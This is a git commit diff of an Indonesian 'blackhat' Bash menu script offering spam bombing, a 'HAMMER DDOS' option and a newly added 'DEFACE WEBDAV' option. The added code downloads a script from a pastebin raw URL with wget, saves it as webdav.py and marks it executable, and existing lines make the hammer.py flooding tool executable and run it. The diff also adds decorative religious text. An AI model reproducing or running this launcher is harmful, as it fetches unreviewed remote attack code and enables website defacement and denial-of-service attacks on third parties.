f5e7c99fec25f696701f27a05c0331a7e5b23b13
Mr_XiD <44462886+safri1234@users.noreply.github.com>
2018-12-26 12:11:53 +0700

    Update and rename bermanfaat.sh to toolislam.sh

--- toolislam.sh
+++ toolislam.sh
@@ -8,8 +8,8 @@ echo                    " [Author   :  MR_XiD            ]"|lolcat
 echo                    " [Team     : JATIM BLACKHAT     ]"|lolcat
 echo                    " [Note     : Jangan reqode ya   ]"|lolcat
 echo                    " [Thansk to: All member         ]"|lolcat
-echo                    " [thanks to: I T A              ]"|lolcat
-echo                    " [Note2    : Copyright©MR_XID   ]"|lolcat
+echo                    " [thanks to: D35TR0Y SQUAD      ]"|lolcat
+echo                    " [Note2    : Copyright©MR_XID   ]"
 echo                    " [======<>======<>======<>======]"|lolcat
 
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
@@ -18,6 +18,8 @@ echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
 echo    " 2. BOM SPAM "   
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
 echo    " 3. HAMMER DDOS "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " 4. DEFACE WEBDAV"
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
 echo    "╭─[PILIH NOMERNYA]"
 read -p "╰─root@./MR_XID=" saf;
@@ -49,16 +51,19 @@ fi
 if [ $fri = 2 ] || [ $fri = 2 ]
 then
 echo " 1. Anak-anak menjadi penuh kemarahan "
-echo " - Dengan kata lain, mereka berani melawan orangtua mereka "
-echo " - Mereka tidak segan-segan berkata kasar dan menghardik orangtua mereka "
+echo " - Dengan kata lain, mereka berani melawan orangtua mereka " | lolcat
+echo " - Mereka tidak segan-segan berkata kasar dan menghardik orangtua mereka " | lolcat
 sleep 2
 echo " 2. Hujan dapat membakar"
-echo "-Jika kita menganalisisnya, hal ini telah terjadi. Sekarang hujan asam semakin sering terjadi "
+echo "-Jika kita menganalisisnya, hal ini telah terjadi. Sekarang hujan asam semakin sering terjadi " | lolcat
 sleep 1
 echo " 3. Orang-orang jahat bertebaran di muka bumi. "
-sleep 1
+sleep 1 
+echo "- sekarang banyak orang yang jahat " | lolcat
+echo "-di katakan dalam" | lolcat
+echo "-kebaikan dibalas dengan kejahatan" | lolcat
 echo " 4. Orang Berkhianat Dipercaya "
-echo "-Orang-orang akan mempercayai orang-orang yang berkhianat, sedangkan orang-orang yang dapat dipercaya dianggap sebagai pengkhianat."
+echo "-Orang-orang akan mempercayai orang-orang yang berkhianat, sedangkan orang-orang yang dapat dipercaya dianggap sebagai pengkhianat." | lolcat
 echo " 5. sekian itu aja yang yang gua sampaikan dan tunggu update tools nya lagi "
 fi
 if [ $fri = 3 ] || [ $fri = 3 ]
@@ -95,5 +100,19 @@ chmod 7777 hammer.py
 sleep 1
 python hammer.py 
 fi
+if [ $saf = 4 ] || [ $saf = 4 ]
+then 
+apt update && apt upgrade
+apt install python2
+pip2 install urllib3 chardet certifi idna requests
+apt install openssl curl
+pkg install libcurl
+mkdir webdav
+cd webdav
+wget https://pastebin.com/raw/HnVyQPtR
+mv HnVyQPtR webdav.py
+sleep 1
+chmod 777 webdav.py
+echo "terinstall bos " | lolcat
 exit
 fi
